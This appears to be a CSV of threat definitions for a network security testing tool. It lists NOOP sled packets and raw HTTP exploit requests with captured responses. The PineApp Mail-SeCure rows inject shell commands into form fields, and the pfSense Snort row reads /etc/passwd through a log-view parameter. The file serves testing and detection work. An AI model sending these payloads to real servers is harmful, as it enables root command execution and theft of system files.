XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿NOOPtcpHP-UNIX2_IPv6.xml,TCP NOOP Packet Variant HP-UNIX 2 (IPv6 Version),"This threat sends a TCP packet that appears to be part of an existing valid connection with a NOOP sled in it. A NOOP sled is used by shellcode to insure that the injected code will execute. Unfortunately, there are many other reasons why a NOOP might appear in traffic. This threat utilized equivalent assembly instructions to the standard NOOP instruction. (IPv6 Version)",TCP/IPv6,TCP,[[0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80]]
﻿NOOPtcpHP-UNIX_IPv6.xml,TCP NOOP Packet Variant HP-UNIX (IPv6 Version),"This threat sends a TCP packet that appears to be part of an existing valid connection with a NOOP sled in it. A NOOP sled is used by shellcode to insure that the injected code will execute. Unfortunately, there are many other reasons why a NOOP might appear in traffic. This threat utilized equivalent assembly instructions to the standard NOOP instruction. (IPv6 Version)",TCP/IPv6,TCP,[[08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80]]
﻿NOOPudpHP-UNIX.xml,UDP NOOP Variant HP-UNIX,"This threat sends UDP packets with a payload filled with NOOP assembly instructions. This gets flagged on IDS systems as a possible shellcode injection attack. NOOPs are used as a sled to insure more probability for shellcode to execute. Unfortunately, NOOPs are also quite common in binary downloads from websites as well, causing many false positives.",UDP,UDP,[[08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80]]
﻿NOOPudpHP-UNIX2.xml,UDP NOOP Variant HP-UNIX 2,"This threat sends UDP packets with a payload filled with NOOP assembly instructions. This gets flagged on IDS systems as a possible shellcode injection attack. NOOPs are used as a sled to insure more probability for shellcode to execute. Unfortunately, NOOPs are also quite common in binary downloads from websites as well, causing many false positives.",UDP,UDP,[[0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80]]
﻿NOOPudpHP-UNIX2_IPv6.xml,UDP NOOP Variant HP-UNIX 2 (IPv6 Version),"This threat sends UDP packets with a payload filled with NOOP assembly instructions. This gets flagged on IDS systems as a possible shellcode injection attack. NOOPs are used as a sled to insure more probability for shellcode to execute. Unfortunately, NOOPs are also quite common in binary downloads from websites as well, causing many false positives. (IPv6 Version)",UDP/IPv6,UDP,[[0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80]]
﻿NOOPudpHP-UNIX_IPv6.xml,UDP NOOP Variant HP-UNIX (IPv6 Version),"This threat sends UDP packets with a payload filled with NOOP assembly instructions. This gets flagged on IDS systems as a possible shellcode injection attack. NOOPs are used as a sled to insure more probability for shellcode to execute. Unfortunately, NOOPs are also quite common in binary downloads from websites as well, causing many false positives. (IPv6 Version)",UDP/IPv6,UDP,[[08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80]]
﻿TSL20130729-15_PineApp_Mail-SeCure_confpremenu.php_Export_Log_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection,"A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while exporting logs.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","HTTPS,HTTP",TCP,POST /admin/confpremenu.php HTTP/1.0[[0D 0A ]]Content-Length: 94[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]pa_run_protection=281x340v&syslog_export_log=1&logname=a&logdir=/tmp;date>/tmp/poc.txt;echo%20
TSL20130729-15_PineApp_Mail-SeCure_confpremenu.php_Export_Log_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection,"A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while exporting logs.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","HTTPS,HTTP",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Mon, 05 Aug 2013 13:21:48 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Set-Cookie: SESSIONID=413a1c6c6629903efb8000346844cbf8; path=/[[0D 0A ]]Expires: Thu, 19 Nov 1981 08:52:00 GMT[[0D 0A ]]Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0[[0D 0A ]]Pragma: no-cache[[0D 0A ]]Content-disposition: attachment; filename=""a.log""[[0D 0A ]]Content-transfer-encoding: binary[[0D 0A ]]Content-length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: application/octet-stream[[0D 0A 0D 0A]]"
﻿TSL20130729-15_PineApp_Mail-SeCure_confpremenu.php_Export_Log_Command_Injection_IPv6.xml,"PineApp Mail-SeCure confpremenu.php Export Log Command Injection [IPv6, Version]","A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while exporting logs.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","IPv6,HTTPS,HTTP",TCP,POST /admin/confpremenu.php HTTP/1.0[[0D 0A ]]Content-Length: 94[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]pa_run_protection=281x340v&syslog_export_log=1&logname=a&logdir=/tmp;date>/tmp/poc.txt;echo%20
TSL20130729-15_PineApp_Mail-SeCure_confpremenu.php_Export_Log_Command_Injection_IPv6.xml,"PineApp Mail-SeCure confpremenu.php Export Log Command Injection [IPv6, Version]","A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while exporting logs.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","IPv6,HTTPS,HTTP",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Mon, 05 Aug 2013 13:21:48 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Set-Cookie: SESSIONID=413a1c6c6629903efb8000346844cbf8; path=/[[0D 0A ]]Expires: Thu, 19 Nov 1981 08:52:00 GMT[[0D 0A ]]Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0[[0D 0A ]]Pragma: no-cache[[0D 0A ]]Content-disposition: attachment; filename=""a.log""[[0D 0A ]]Content-transfer-encoding: binary[[0D 0A ]]Content-length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: application/octet-stream[[0D 0A 0D 0A]]"
﻿TSL20130729-15_PineApp_Mail-SeCure_confpremenu_php_Export_Log_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection,A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation error in the confpremenu.php script while exporting logs. A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server. Successful exploitation could result in commands being executed with root privileges.,"HTTP,HTTPS",TCP,POST /admin/confpremenu.php HTTP/1.0[[0D 0A ]]Content-Length: 94[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]pa_run_protection=281x340v&syslog_export_log=1&logname=a&logdir=/tmp;date>/tmp/poc.txt;echo%20
TSL20130729-15_PineApp_Mail-SeCure_confpremenu_php_Export_Log_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection,A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation error in the confpremenu.php script while exporting logs. A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server. Successful exploitation could result in commands being executed with root privileges.,"HTTP,HTTPS",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Mon, 05 Aug 2013 13:21:48 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Set-Cookie: SESSIONID=413a1c6c6629903efb8000346844cbf8; path=/[[0D 0A ]]Expires: Thu, 19 Nov 1981 08:52:00 GMT[[0D 0A ]]Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0[[0D 0A ]]Pragma: no-cache[[0D 0A ]]Content-disposition: attachment; filename=""a.log""[[0D 0A ]]Content-transfer-encoding: binary[[0D 0A ]]Content-length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: application/octet-stream[[0D 0A 0D 0A]]"
﻿TSL20130729-15_PineApp_Mail-SeCure_confpremenu_php_Export_Log_Command_Injection_IPv6.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection(IPv6 Version),A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation error in the confpremenu.php script while exporting logs. A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server. Successful exploitation could result in commands being executed with root privileges.,"HTTP,HTTPS,IPV6",TCP,POST /admin/confpremenu.php HTTP/1.0[[0D 0A ]]Content-Length: 94[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]pa_run_protection=281x340v&syslog_export_log=1&logname=a&logdir=/tmp;date>/tmp/poc.txt;echo%20
TSL20130729-15_PineApp_Mail-SeCure_confpremenu_php_Export_Log_Command_Injection_IPv6.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection(IPv6 Version),A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation error in the confpremenu.php script while exporting logs. A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server. Successful exploitation could result in commands being executed with root privileges.,"HTTP,HTTPS,IPV6",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Mon, 05 Aug 2013 13:21:48 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Set-Cookie: SESSIONID=413a1c6c6629903efb8000346844cbf8; path=/[[0D 0A ]]Expires: Thu, 19 Nov 1981 08:52:00 GMT[[0D 0A ]]Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0[[0D 0A ]]Pragma: no-cache[[0D 0A ]]Content-disposition: attachment; filename=""a.log""[[0D 0A ]]Content-transfer-encoding: binary[[0D 0A ]]Content-length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: application/octet-stream[[0D 0A 0D 0A]]"
﻿TSL20130729-16_PineApp_Mail-SeCure_confpremenu.php_Install_License_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Install License Command Injection,"A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while installing licenses.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","HTTP,HTTPS",TCP,POST /admin/confpremenu.php HTTP/1.0[[0D 0A ]]Content-Length: 87[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]pa_run_protection=281x340v&instlic=Install&confcode=&newkey=a;date>/tmp/poc.txt;echo%20
TSL20130729-16_PineApp_Mail-SeCure_confpremenu.php_Install_License_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Install License Command Injection,"A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while installing licenses.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 13 Aug 2013 11:12:26 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Set-Cookie: SESSIONID=5ceaf2cf2fbc938afc61002c6a89e1ef; path=/[[0D 0A ]]Expires: Thu, 19 Nov 1981 08:52:00 GMT[[0D 0A ]]Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0[[0D 0A ]]Pragma: no-cache[[0D 0A ]]Content-Length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html[[0D 0A 0D 0A]]"
﻿TSL20130729-16_PineApp_Mail-SeCure_confpremenu.php_Install_License_Command_Injection_IPv6.xml,"PineApp Mail-SeCure confpremenu.php Install License Command Injection [IPv6, Version]","A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while installing licenses.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","IPv6, HTTP,HTTPS",TCP,POST /admin/confpremenu.php HTTP/1.0[[0D 0A ]]Content-Length: 87[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]pa_run_protection=281x340v&instlic=Install&confcode=&newkey=a;date>/tmp/poc.txt;echo%20
TSL20130729-16_PineApp_Mail-SeCure_confpremenu.php_Install_License_Command_Injection_IPv6.xml,"PineApp Mail-SeCure confpremenu.php Install License Command Injection [IPv6, Version]","A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while installing licenses.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","IPv6, HTTP,HTTPS",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 13 Aug 2013 11:12:26 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Set-Cookie: SESSIONID=5ceaf2cf2fbc938afc61002c6a89e1ef; path=/[[0D 0A ]]Expires: Thu, 19 Nov 1981 08:52:00 GMT[[0D 0A ]]Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0[[0D 0A ]]Pragma: no-cache[[0D 0A ]]Content-Length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html[[0D 0A 0D 0A]]"
﻿TSL20140128-08_ESF_pfSense_Snort_snort_log_view_php_Information_Disclosure.xml,ESF pfSense Snort snort_log_view.php Information Disclosure,"An information disclosure vulnerability exists in the pfSense Snort service. The vulnerability is due to insufficient validation of user-supplied input. A remote, authenticated attacker could use this vulnerability to retrieve valuable information from the server. Successful exploitation could lead to information disclosure in the security context of the root user.","HTTP,HTTPS",TCP,GET index.php HTTP/1.1[[0D 0A ]]Host: 172.16.8.253[[0D 0A ]]Accept-Encoding: identityContent Length: 0[[0D 0A 0D 0A]]
TSL20140128-08_ESF_pfSense_Snort_snort_log_view_php_Information_Disclosure.xml,ESF pfSense Snort snort_log_view.php Information Disclosure,"An information disclosure vulnerability exists in the pfSense Snort service. The vulnerability is due to insufficient validation of user-supplied input. A remote, authenticated attacker could use this vulnerability to retrieve valuable information from the server. Successful exploitation could lead to information disclosure in the security context of the root user.","HTTP,HTTPS",TCP,POST index.php HTTP/1.1[[0D 0A ]]HOST: 172.16.8.253[[0D 0A ]]Accept-Encoding: identity[[0D 0A ]]Content-Length: 179[[0D 0A ]]Cookie: PHPSESSID=9aff147ec3cc97fcc74ab15c6f36f5fa; cookie_test=1391633825[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]__csrf_magic=sid%3Ada42ca94893c20178abe96db3ad67a7bd6dfe938%2C1391630225%3Bip%3A79c9a9311522c34da39a6f005b167d572da4b345%2C1391630225&usernamefld=test&passwordfld=test&login=Login
TSL20140128-08_ESF_pfSense_Snort_snort_log_view_php_Information_Disclosure.xml,ESF pfSense Snort snort_log_view.php Information Disclosure,"An information disclosure vulnerability exists in the pfSense Snort service. The vulnerability is due to insufficient validation of user-supplied input. A remote, authenticated attacker could use this vulnerability to retrieve valuable information from the server. Successful exploitation could lead to information disclosure in the security context of the root user.","HTTP,HTTPS",TCP,GET /snort/snort_log_view.php?logfile=/etc/passwd HTTP/1.1[[0D 0A ]]Host: 172.16.8.253[[0D 0A ]]Accept-Encoding: identity[[0D 0A ]]Cookie: PHPSESSID=9aff147ec3cc97fcc74ab15c6f36f5fa; cookie_test=1391633825[[0D 0A 0D 0A]]
